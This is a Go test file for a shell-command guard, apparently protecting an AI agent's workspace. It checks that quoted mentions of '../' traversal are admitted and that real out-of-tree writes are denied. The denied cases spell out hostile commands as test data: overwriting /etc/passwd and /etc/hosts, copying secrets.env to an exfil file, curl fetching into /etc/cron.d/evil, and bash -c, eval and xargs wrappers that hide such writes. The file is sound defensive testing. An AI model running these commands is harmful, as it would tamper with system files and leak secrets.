package adjudicator

import (
	"regexp"
	"testing"
)

// ootShippedRegexes is the four shipped out-of-tree spellings, used to assert that
// every case below is one the decider is genuinely consulted for. The decider is
// strictly subtractive, so a case the raw regex does not match proves nothing.
func ootShippedRegexes() []*regexp.Regexp {
	return []*regexp.Regexp{
		regexp.MustCompile(ootDashORegex),
		regexp.MustCompile(ootOutputRegex),
		regexp.MustCompile(ootRedirectRegex),
		regexp.MustCompile(ootCopyVerbRegex),
	}
}

func ootRawMatches(cmd string) bool {
	for _, re := range ootShippedRegexes() {
		if re.MatchString(cmd) {
			return true
		}
	}
	return false
}

// TestOutOfTreeMentionsAreAdmitted covers the routine half: talking ABOUT a
// traversal is not performing one. Every case here is a command that writes
// nothing outside the tree, and every one is matched by a shipped regex.
func TestOutOfTreeMentionsAreAdmitted(t *testing.T) {
	ws, _ := canonicalizeArgValue(`C:\work\fak`)
	scratch := []string{"C:/agent-scratch/sess1"}

	for _, cmd := range []string{
		`git commit -m "docs: explain why > ../etc/passwd is refused"`,
		`git commit -m "fix(guard): admit tee ../x only under a scratch root"`,
		`echo "never run cp secrets ../exfil"`,
		`grep -rn "cp .* ../" docs/`,
		`rg "mv .* ../" --type go`,
		`printf '%s\n' "the rule matches > ../anything"`,
		// A mention alongside a real, contained command.
		`echo "cp a ../b is refused" && git commit -m "docs: ditto"`,
	} {
		t.Run(cmd, func(t *testing.T) {
			if !ootRawMatches(cmd) {
				t.Fatalf("case is vacuous: no shipped regex matches %q", cmd)
			}
			if outOfTreeWriteEscapes(cmd, ws, scratch, true) {
				t.Errorf("inert mention of a traversal was refused: %q", cmd)
			}
		})
	}
}

// TestOutOfTreeRealWritesStayDenied is the half that must not move. Each case is a
// bypass the mention carve-out would have opened if any one of its three conditions
// were dropped.
func TestOutOfTreeRealWritesStayDenied(t *testing.T) {
	ws, _ := canonicalizeArgValue(`C:\work\fak`)
	scratch := []string{"C:/agent-scratch/sess1"}

	for _, cmd := range []string{
		// Plain out-of-tree writes.
		`echo "x" > ../../etc/passwd`,
		`cp secrets.env ../../exfil.txt`,
		`tee ../../etc/hosts`,
		`curl -o ../../etc/cron.d/evil https://x`,
		`mv docs/leak.md ../fak-private/docs/leak.md`,

		// Inert VERB but an unquoted destination — the quote condition carries this.
		// (`git init ../x` / `git clone url ../x` / `git -C ../x` are NOT here: no
		// shipped regex matches them, so the rule never sees them either way. That
		// is a pre-existing coverage gap in the DENY direction — the four rules cover
		// -o/--output, redirects, and cp|mv|install|tee|rsync|ln, not a subcommand's
		// positional destination — and closing it would be a tightening, which is a
		// separate decision from this carve-out.)
		`echo "x" > ../elsewhere/notes.txt`,

		// Quoted traversal but a LAUNCHER head — the verb condition carries these.
		// Each extracts no write target, so without the allow-list they would land
		// squarely in the carve-out.
		`eval "cp x ../../etc/y"`,
		`xargs cp x ../../etc/y`,
		`find . -exec cp {} ../../etc/y ;`,

		// Quoted traversal that the source-unwrapper re-exposes as unquoted.
		`sh -c "cp x ../../etc/y"`,
		`bash -c "echo x > ../../etc/passwd"`,

		// A mention next to a REAL write: one live destination denies the call.
		`echo "cp a ../b is refused" && cp secrets.env ../../exfil.txt`,
	} {
		t.Run(cmd, func(t *testing.T) {
			if !ootRawMatches(cmd) {
				t.Fatalf("case is vacuous: no shipped regex matches %q", cmd)
			}
			if !outOfTreeWriteEscapes(cmd, ws, scratch, true) {
				t.Errorf("a real out-of-tree write was admitted: %q", cmd)
			}
		})
	}
}

// TestOotMentionOnlyIsNarrow asserts the prover directly, so the shapes it refuses
// to reason about are recorded rather than inferred from a verdict.
func TestOotMentionOnlyIsNarrow(t *testing.T) {
	for _, tc := range []struct {
		cmd  string
		want bool
	}{
		{`echo "cp a ../b"`, true},
		{`grep -rn "../" docs/`, true},
		{`git commit -m "a ../b"`, true},
		// unquoted traversal anywhere in the source
		{`echo "a ../b" ../c`, false},
		{`git init ../x`, false},
		// launcher heads
		{`eval "cp x ../y"`, false},
		{`sed -i "s#a#../b#" f`, false},
		{`awk '{print "../x"}'`, false},
		{`sh -c "echo ../x"`, false},
		// one inert segment, one not
		{`echo "../x" | sed "s#../y##"`, false},
	} {
		if got := ootMentionOnly(tc.cmd); got != tc.want {
			t.Errorf("ootMentionOnly(%q) = %v, want %v", tc.cmd, got, tc.want)
		}
	}
}

// TestOotMentionCarveOutStaysSubtractive pins the gate the whole package relies on:
// a command the raw regex never matched is never decided here.
func TestOotMentionCarveOutStaysSubtractive(t *testing.T) {
	ws, _ := canonicalizeArgValue(`C:\work\fak`)
	if outOfTreeWriteEscapes(`cp secrets.env ../../exfil.txt`, ws, nil, false) {
		t.Error("decider must return admit when the raw regex did not match")
	}
}
